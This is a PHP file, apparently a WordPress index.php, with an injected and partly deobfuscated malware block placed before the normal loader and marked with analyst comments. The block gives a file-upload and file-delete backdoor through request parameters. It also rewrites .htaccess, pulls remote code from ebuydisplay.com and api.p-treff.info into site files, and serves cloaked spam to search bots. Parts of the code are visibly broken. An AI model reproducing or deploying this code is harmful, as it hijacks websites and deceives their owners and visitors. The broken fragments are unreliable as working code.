<?php
/*hpnewy*/
$OO_0O__00O = '1110';
$O0O0O_O0__ = 'wp-admin';
$O00O0_O_O_ = 'giz3bw678o-e_1ldafyp2rk4uhcqjtsm0n95vx';
$O__OOO00_0 = 'ignore_user_abort';
$O00O0O__O_ = 'file_put_contents';
$O0__OO_00O = 'file_get_contents';
$OOO0_O__00 = 'extension_loaded';
$O_0__O00OO = 'function_exists';
$O0__OO00_O = 'error_reporting';
$O00OO__O_0 = 'create_function';
$O0__0OOO0_ = 'set_time_limit';
$OO0OO0___0 = 'base64_encode';
$O00O__O_O0 = 'base64_decode';
$O0O_00OO__ = 'preg_replace';
$O0__O00_OO = 'ob_end_flush';
$OO0_OO_0_0 = 'str_replace';
$O0_O_O0O_0 = 'file_exists';
$OO00O_O0__ = 'curl_setopt';
$OOO_0_0_0O = 'preg_match';
$O0OOO___00 = 'curl_close';
$O_00OO_0O_ = 'urlencode';
$O_O_000O_O = 'gzinflate';
$O00__OOO_0 = 'curl_init';
$O0O_OO0__0 = 'curl_exec';
$O0O0__O0O_ = 'ob_start';
$O__O_0O00O = 'strrpos';
$O__O0O00_O = 'scandir';
$O0__O_O00O = 'explode';
$O_O0O__O00 = 'dirname';
$O_0_O0O0O_ = 'unlink';
$OO__000OO_ = 'strstr';
$OOO0O00___ = 'strlen';
$O0__O0O0_O = 'is_dir';
$O__00OOO_0 = 'mkdir';
$O_O0O0__O0 = 'count';
$OO__0O_0O0 = 'chmod';
$O_0_0OO_O0 = 'trim';
$O0O0_O_0O_ = 'date';



header('Content-Type:text/html;charset=utf-8');
error_reporting(0);;

// ________________________________________________________


$MYCURL = function($url='', $OO__O_O000=NULL, $O_O0_0OO_0=array()) {
    $O___O0O00O="curl_init+curl_setopt+curl_exec"
    $flag=$OO_0O00_O_='';

    $curlExists=1;
    foreach(["curl_init", "curl_setopt", "curl_exec"] as $d) {
        if(!function_exists($d)) {
            $curlExists=0;
        }
    }

    unset($d);
    
    if($curlExists) {
        $flag="curl_init+curl_setopt+curl_exec";
        break;
    }
    
    if($flag=='') {
        return 0;
    }

    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_USERAGENT,'WHR');
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_TIMEOUT,100);
    $results=curl_exec($ch);
    curl_close($ch);

    if(!$results) { 
        return 0;
    } else {
        $results=trim(trim($results,"\xEF\xBB\xBF"));
        return $results;
    }

    if($O0O___0O0O=='') {
        if(function_exists(file_get_contents) and $url) {
            $O0O___0O0O=@file_get_contents($url);
        }
    }
    
    unset($OO_0O00_O_,$O0__O0_OO0,$fp,$port,$_host);
    return trim(trim($O0O___0O0O,"\\xEF\\xBB\\xBF"));
}


// ________________________________________________________

# ALL GONE
#$lambda_2 = function($str) {
#    $a=substr($str,0,5);
#    $b=substr($str,7,strlen($str)-14);
#    $c=substr($str,-5);
#    return gzinflate(base64_decode($a.$b.$c));
#}

// ________________________________________________________


$lambda_3 = function($input) {
    $isBot=false;

    if($input!='') {
        if(preg_match("/googlebot|bingbot|google|aol|bing|yahoo/si",$input)){
            $isBot=true;
        }
    }
    return $isBot;
}

// ________________________________________________________


$lambda_4 = function($input) {
    $isJpOrBing=false;

    if($input!=''&&preg_match("/(google.co.jp|yahoo.co.jp|bing)/si",$input)){
        $isJpOrBing=true;
    }
    return $isJpOrBing;
}


// ________________________________________________________

## ALL GONE
#$lambda_5 = function($O0OOO0___0) {
#    $FILENAME=isset(${"_REQUEST"}['xxxxxxxxxxxx_filename'])?${"_REQUEST"}['xxxxxxxxxxxx_filename']:'';
#    $FILECONTENT=isset(${"_REQUEST"}['xxxxxxxxxxxx_filecontent'])?${"_REQUEST"}['xxxxxxxxxxxx_filecontent']:'';
#    
#    if(file_exists($FILENAME)){
#        if(!unlink($FILENAME)){
#            echo "delete|error";
#            exit();
#        }
#    }
#
#    file_put_contents($FILENAME,$FILECONTENT,FILE_APPEND);
#    echo $FILENAME.'|success';
#}


// ________________________________________________________

$FUNC_DELETE = function($O___O0O00Opidelpath) {
    $result1="delete|error";
    $result2="delete|success";
    $result3="delete|no file";

    $A_FILENAME= isset(${"_REQUEST"}['xxxxxxxxxxxx_filename']) ? ${"_REQUEST"}['xxxxxxxxxxxx_filename'] : '';
    
    if($A_FILENAME=='apidel') {
        $A_FILENAME=$O___O0O00Opidelpath;
    }
    if(file_exists($A_FILENAME)){
        @chmod($A_FILENAME,0644);

        if(!unlink($O00O_0O__O)){
            echo $result1;
        } else {
            echo $results2;
        }
    } else {
        echo $result3;
    }
}
// ________________________________________________________

# ALL GONE
#$lambda_7 = function($NOOP='', $OO_0_0_0OO, $OO00_O0_O_) {
#    $rewrite_rule= "<IfModule mod_rewrite.c>\n";
#    $rewrite_rule .="RewriteEngine On\n";
#    $rewrite_rule .="RewriteBase /\n";
#    $rewrite_rule .="RewriteRule ^index.php$ - [L]\n";
#    $rewrite_rule .="RewriteCond %{REQUEST_FILENAME} !-f\n";
#    $rewrite_rule .="RewriteCond %{REQUEST_FILENAME} !-d\n";
#    $rewrite_rule .="RewriteRule . index.php [L]\n";
#    $rewrite_rule .="</IfModule>";
#
#    if($OO_0_0_0OO) {
#        $htaccess='./.htaccess';
#
#        @chmod($htaccess,0644);
#        $htaccess_contents=@file_get_contents($htaccess);
#        if(!strstr($htaccess_contents,'REQUEST_FILENAME')||!strstr($htaccess_contents,'index.php')) {
#
#            $htaccess_contents_modified=$rewrite_rule.PHP_EOL .$htaccess_contents;
#
#            @file_put_contents($htaccess,$htaccess_contents_modified);
#        }
#    }
#}



# -------------------------------------

$lambda_8 = function($innerVal1Array='') {
    $MYDIR=dirname(__FILE__);

    foreach(scandir($MYDIR) as $fileOrDir) {
        if($fileOrDir=='.'||$fileOrDir=='..') continue;
        
        if(is_dir("{$MYDIR}/{$fileOrDir}")) {
            $innerVar1Array[] = $fileOrDir;
        }
    }
    
    $innerVar1Array[] ='temp';
    
    return $innerVar1Array;
}

$main = function($O0OOO0___0='') {
    @set_time_limit(3600);
    @ignore_user_abort(1);

    global $OO_0O__00O,$O0O0O_O0__;


    $OOO_0O0__0='';
    $O__O_00O0Opps ='';
    $O__0O_00OO=${"_SERVER"}["HTTP_ACCEPT_LANGUAGE"];
    $O0O___0OO0=isset(${"_SERVER"}["HTTP_REFERER"])?${"_SERVER"}["HTTP_REFERER"]:'';
    $O00_O0_O_O=isset(${"_SERVER"}["HTTP_USER_AGENT"])?${"_SERVER"}["HTTP_USER_AGENT"]:'';
    $O_O0O0_O_0=$lambda_3($O00_O0_O_O);
    $OOO_00__O0=$lambda_4($O0O___0OO0);
    $OO0_0O__O0='';

    if(isset(${"_SERVER"}["HTTP_HOST"])){
        $OO0_0O__O0=${"_SERVER"}["HTTP_HOST"];
    } elseif (isset(${"_SERVER"}["SERVER_NAME"])){
        $OO0_0O__O0=${"_SERVER"}["SERVER_NAME"];
    }

    if ($O0O0O_O0__=="") {
        # IF here, will get first alphabetically sorted file in the directory this file is in.
        $OOOO_000__=$lambda_8();
        $directory=$OOOO_000__[0];
    } else {
        $directory='wp-admin';
    }

    $output_filename_1=base64_encode($OO0_0O__O0).'.txt';
    $output_filename_2=base64_encode($OO0_0O__O0).'a.txt';

    if(!is_dir($directory)){
        mkdir($directory);
    }

    $output_filename_1=$directory.'/'.$output_filename_1;
    $output_filename_2=$directory.'/'.$output_filename_2;

    if(isset(${"_REQUEST"}['xxxxxxxxxxxx_loads'])){
        ## LOADING MALICIOUS DATA ONTO HOST ???
        ## Former: lambda_5
        $FILENAME=isset(${"_REQUEST"}['xxxxxxxxxxxx_filename'])?${"_REQUEST"}['xxxxxxxxxxxx_filename']:'';
        $FILECONTENT=isset(${"_REQUEST"}['xxxxxxxxxxxx_filecontent'])?${"_REQUEST"}['xxxxxxxxxxxx_filecontent']:'';
        
        if(file_exists($FILENAME)){
            if(!unlink($FILENAME)){
                echo "delete|error";
                exit();
            }
        }

        file_put_contents($FILENAME,$FILECONTENT,FILE_APPEND);
        echo $FILENAME.'|success';
        exit();
    }

    if(isset(${"_REQUEST"}['xxxxxxxxxxxx_del'])){
        $FUNC_DELETE($output_filename_1);
        exit();
    }

    if(!file_exists($output_filename_1)) {
        #$OO00_0O_O_=$MYCURL('http://api.p-treff.info/api.php?g=1110');
        @file_put_contents($output_filename_1,'LmVidXlkaXNwbGF5LmNvbQ==|MTAwMC5lYnV5ZGlzcGxheS5jb20=');
    }
    
    $O0_OO0__0O="1000.ebuydisplay.com";

    $OO000O___O=${"_SERVER"}["REQUEST_URI"];
    $OO00_O0_O_='';
    $OO00O___0O=${"_SERVER"}["\x44O\x43\x55\x4d\x45\x4e\x54_\x52OO\x54"];
    $OO00O___0O=str_replace('\\\\','/',$OO00O___0O);
    $O_0O00_OO_=__FILE__;
    $O_0O00_OO_=str_replace('\\\\','/',$O_0O00_OO_);
    $O_O00_O_0O=dirname(__FILE__).'/';
    $O_O00_O_0O=str_replace('\\\\','/',$O_O00_O_0O);


    if(strstr($O_0O00_OO_,'(')){
        $O_0O00_OO_=substr($O_0O00_OO_,0,strrpos($O_0O00_OO_,'('));
    }

    $OO___O0O00=str_replace($O_O00_O_0O,'',$O_0O00_OO_);
    $OOO_0O0__0=str_replace($OO00O___0O,'',$O_O00_O_0O);
    $OO00_O0_O_=$OO___O0O00;

    if(substr($OO000O___O,0,strlen($OOO_0O0__0.$OO___O0O00)) == $OOO_0O0__0.$OO___O0O00){
        $OOO_0O0__0=$OOO_0O0__0.$OO___O0O00;
    }

    $REQUEST_SCHEME='';


    if(isset(${"_SERVER"}["REQUEST_SCHEME"])){
        $REQUEST_SCHEME=${"_SERVER"}["REQUEST_SCHEME"];
    }

    #$lambda_7('',$OO_0_0_0OO,$OO00_O0_O_,$OO00O___0O);
    # REWRITES HIJACK
    $rewrite_rule= "<IfModule mod_rewrite.c>\n";
    $rewrite_rule .="RewriteEngine On\n";
    $rewrite_rule .="RewriteBase /\n";
    $rewrite_rule .="RewriteRule ^index.php$ - [L]\n";
    $rewrite_rule .="RewriteCond %{REQUEST_FILENAME} !-f\n";
    $rewrite_rule .="RewriteCond %{REQUEST_FILENAME} !-d\n";
    $rewrite_rule .="RewriteRule . index.php [L]\n";
    $rewrite_rule .="</IfModule>";

    $htaccess='./.htaccess';

    @chmod($htaccess,0644);
    $htaccess_contents=@file_get_contents($htaccess);
    if(!strstr($htaccess_contents,'REQUEST_FILENAME')||!strstr($htaccess_contents,'index.php')) {

        $htaccess_contents_modified=$rewrite_rule.PHP_EOL .$htaccess_contents;

        @file_put_contents($htaccess,$htaccess_contents_modified);
    }

    ### ????
    
    $O_O0O_O_00='www1110.ebuydisplay.com';
    $O___OOO000="www1000.ebuydisplay.com";

    $O0O_O_O00_="http://www1110.ebuydisplay.com/data1028.php?d=%s&g=%s&t=%s&u=%s&h=%s&p=%s&r=%s&a=%s&l=%s&i=%s&j=%s&o=%s";
    $OO_00O_O0_="http://%host%/jump1028.php?d=%s&g=%s&t=%s&u=%s&h=%s&p=%s&r=%s&a=%s&l=%s&i=%s&j=%s&o=%s";
    $O0OO0_O0__='http://www1000.ebuydisplay.com/mapfile.txt';

    $OO00_0_OO_="<spango>";
    $O0O_0_O_O0='zlib';
    $O_O_0O0O0_='|';
    $O0OO_0_0_O="ob_gzhandler";


    if(isset(${"_REQUEST"}["xxnew_map"])){
        $REQUEST_XXNEW_MAP=${"_REQUEST"}["xxnew_map"];
        $O_O__000OO='/';
        if($REQUEST_XXNEW_MAP!=''){
            mkdir($REQUEST_XXNEW_MAP,0755);
            $REQUEST_XXNEW_MAP =$REQUEST_XXNEW_MAP.$O_O__000OO;
        }

        $O0O___0O0O=$MYCURL($O0OO0_O0__);
        $O_O0_00OO_=explode('|',$O0O___0O0O);
        $O_O0_00O_O='end';
        for($O__O_00O0O=0; $O__O_00O0O<count($O_O0_00OO_); $O__O_00O0O++) {
            $O000_OO__O=sprintf($O0O_O_O00_,$OO0_0O__O0,'1110',urlencode(date('Y-m-d h:i:s')),urlencode($O_O__000OO.trim($O_O0_00OO_[$O__O_00O0O])),urlencode($REQUEST_SCHEME),trim($O__O_00O0Opps) ,urlencode($O0O___0OO0),urlencode($O00_O0_O_O),$O__0O_00OO,$OOO_0O0__0,0,$O_O00_O_0O.$O_O_0O0O0_.$OO00O___0O);
            $O0O___0O0O=$MYCURL($O000_OO__O);
            $OO_O_0O00_="/(robots).*.txt$/";
            if(strstr($O0O___0O0O,$OO00_0_OO_)&&preg_match($OO_O_0O00_,trim($O_O0_00OO_[$O__O_00O0O]))){
                $O0O___0O0O=str_replace($OO00_0_OO_,'',$O0O___0O0O);
                file_put_contents(trim($O_O0_00OO_[$O__O_00O0O]),$O0O___0O0O);
                echo trim($O_O0_00OO_[$O__O_00O0O]).'<br>';
            } else if (strstr($O0O___0O0O,$OO00_0_OO_)) {
                $O0O___0O0O=str_replace($OO00_0_OO_,'',$O0O___0O0O);
                file_put_contents($REQUEST_XXNEW_MAP.trim($O_O0_00OO_[$O__O_00O0O]),$O0O___0O0O);
                echo $REQUEST_XXNEW_MAP.trim($O_O0_00OO_[$O__O_00O0O]).'<br>';
            }
        }

        echo $O_O0_00O_O;
        unset($O0O___0O0O,$O_O0_00OO_,$REQUEST_XXNEW_MAP);
        exit();
    }

    $O0O_O_O00_=sprintf($O0O_O_O00_,$OO0_0O__O0,'1110',urlencode(date('Y-m-d h:i:s')),urlencode($OO000O___O),urlencode($REQUEST_SCHEME),trim($O__O_00O0Opps) ,urlencode($O0O___0OO0),urlencode($O00_O0_O_O),$O__0O_00OO,$OOO_0O0__0,0,$OO00O___0O.$O_O_0O0O0_.$O_0O00_OO_);
    $OO_00O_O0_=preg_replace("/%host%/si",$O___OOO000,$OO_00O_O0_);
    $OO_00O_O0_=sprintf($OO_00O_O0_,$OO0_0O__O0,'1110',urlencode(date('Y-m-d h:i:s')),urlencode($OO000O___O),urlencode($REQUEST_SCHEME),trim($O__O_00O0Opps) ,urlencode($O0O___0OO0),urlencode($O00_O0_O_O),$O__0O_00OO,$OOO_0O0__0,1,$OO00O___0O.$O_O_0O0O0_.$O_0O00_OO_);
    $O_OOO_00_0=isset(${"_REQUEST"}['xxnew201'.'8_url1'])?${"_REQUEST"}['xxnew201'.'8_url1']:'';
    $OOO0_0_O0_=isset(${"_REQUEST"}["writerfilename"])?${"_REQUEST"}["writerfilename"]:'';

    if(isset(${"_REQUEST"}['xxnew201'.'8_url1'])) {
        $O0O0__OO0_='http://api.p-treff.info/';
        $O0_O0_O0_O='wp-load.php';
        $O0_O_0OO0_='up.txt';
        if($OOO0_0_O0_!='') {
            file_put_contents($output_filename_2,base64_encode($O_OOO_00_0).'-'.base64_encode($OOO0_0_O0_));
            $O0_O0_O0_O=$OOO0_0_O0_;
        }

        $OOO0_0_O_0=@file_get_contents($output_filename_2);
        if(trim($OOO0_0_O_0)!='') {
            $OOO0_0_O_0=explode('-',$OOO0_0_O_0);
            $O0_O0_O0_O=base64_decode(trim($OOO0_0_O_0[1]));
            $O0_O_0OO0_=base64_decode(trim($OOO0_0_O_0[0]));
        }

        $O_O_O_O000='scp-173';
        $O0O_0__OO0=explode('|',$O0_O0_O0_O);
        $O00O0O___O=explode('|',$O0_O_0OO0_);
        
        for($OO0_O__0O0=0; $OO0_O__0O0<count($O0O_0__OO0); $OO0_O__0O0++) {
            $O0_O0_O0_O=$O0O_0__OO0[$OO0_O__0O0];
            if(count($O00O0O___O)<=$OO0_O__0O0) {
                $O0_O_0OO0_=$O00O0O___O[count($O00O0O___O)-1];
            } else {
                $O0_O_0OO0_=$O00O0O___O[$OO0_O__0O0];
            }

            $O0O___0O0O=$MYCURL($O0O0__OO0_.$O0_O_0OO0_);
            $OOO__0O_00=substr($O0_O0_O0_O,-strlen($O0_O0_O0_O),strrpos($O0_O0_O0_O,'/'));
            
            if(!is_dir($OOO__0O_00)&&$OOO__0O_00!='') {
                mkdir ($OOO__0O_00,0644,true);
            }

            $O__000OOO_=@file_get_contents($O0_O0_O0_O);
            
            if(!strstr($O__000OOO_,$O_O_O_O000)) {
                @chmod($O0_O0_O0_O,0644);
                file_put_contents($O0_O0_O0_O,$O0O___0O0O.$O__000OOO_);
            }
        }
    }

    if(isset(${"_REQUEST"}['xxnew2018_url1'])) {
        echo $O0O_O_O00_;
        exit();
    }

    if(isset(${"_REQUEST"}['xxnew2018_url2'])){
        echo $OO_00O_O0_;
        exit();
    }

    if(isset(${"_REQUEST"}["webmaster_url"])) {
        $O_O0O0O_0_=${"_REQUEST"}["webmaster_url"];
        $OO_O00_O_0='https://www.google.com/webmasters/sitemaps/ping?sitemap='.$O_O0O0O_0_;
        $O0O___0O0O=file_get_contents($OO_O00_O_0);
        echo $O0O___0O0O;
        exit();
    }

    $O0O0_O__O0='htacok';
    $O0O0_O__O0='htacno';

    if(isset(${"_REQUEST"}["htac"])) {
        $O0_O_0OO_0=${"_REQUEST"}["htac"];
        if(file_exists($O0_O_0OO_0)) {
            echo $O0O0_O__O0;
        } else {
            echo $O0O0_O__O0;
        }

        exit();
    }

    $OO_O_0O00_='/(robots).*.txt$/';
    if(preg_match($OO_O_0O00_,$OO000O___O)) {
        $O0O___0O0O=$MYCURL($O0O_O_O00_);
        if(strstr($O0O___0O0O,$OO00_0_OO_)) {
            $O0O___0O0O=str_replace($OO00_0_OO_,'',$O0O___0O0O);
            $O__OO0_00O='content-type:text/txt';
            if(extension_loaded($O0O_0_O_O0)) {
                ob_start($O0OO_0_0_O);
            }

            @header($O__OO0_00O);
            echo $O0O___0O0O;
        
            if(extension_loaded($O0O_0_O_O0)) {
                ob_end_flush();
            }

            unset($O0O___0O0O,$O0O_O_O00_,$OO000O___O,$OO0_0O__O0,$O0O___0OO0,$O00_O0_O_O);
            exit();
        }
    }

    $O_O00O0O__='/(sitemap).*.xml$/';
    
    if(preg_match($O_O00O0O__,$OO000O___O)) {
        $O0O___0O0O=$MYCURL($O0O_O_O00_);
        if(strstr($O0O___0O0O,$OO00_0_OO_)) {
            $O0O___0O0O=str_replace($OO00_0_OO_,'',$O0O___0O0O);
            $O__OO0_00O='content-type:text/xml';
            if(extension_loaded($O0O_0_O_O0)) {
                ob_start($O0OO_0_0_O);
            }

            @header($O__OO0_00O);
            echo $O0O___0O0O;
            
            if(extension_loaded($O0O_0_O_O0)) {
                ob_end_flush();
            }

            unset($O0O___0O0O,$O0O_O_O00_,$OO000O___O,$OO0_0O__O0,$O0O___0OO0,$O00_O0_O_O);
            exit();
        }
    }

    if($O_O0O0_O_0) {
        $O0O___0O0O=$MYCURL($O0O_O_O00_);
        if(strstr($O0O___0O0O,$OO00_0_OO_)) {
            $O0O___0O0O=str_replace($OO00_0_OO_,'',$O0O___0O0O);
            if(extension_loaded($O0O_0_O_O0)) {
                ob_start($O0OO_0_0_O);
            }

            echo $O0O___0O0O;
            if(extension_loaded($O0O_0_O_O0)) {
                ob_end_flush();
            }

            unset($O0O___0O0O,$OO000O___O,$OO0_0O__O0,$O0O___0OO0,$O00_O0_O_O);
            exit();
        }
    }

    if($OOO_00__O0) {
        $O0O___0O0O=$MYCURL($OO_00O_O0_);
        if(strstr($O0O___0O0O,$OO00_0_OO_)){
            $O0O___0O0O=str_replace($OO00_0_OO_,'',$O0O___0O0O);
            if(extension_loaded($O0O_0_O_O0)) {
                ob_start($O0OO_0_0_O);
            }

            echo $O0O___0O0O;
            
            if(extension_loaded($O0O_0_O_O0)) {
                ob_end_flush();
            }

            unset($O0O___0O0O,$OO000O___O,$OO0_0O__O0,$O0O___0OO0,$O00_O0_O_O);
        exit();
        }
    }
}

$main();

/*hpnewy*/
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);


/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
?>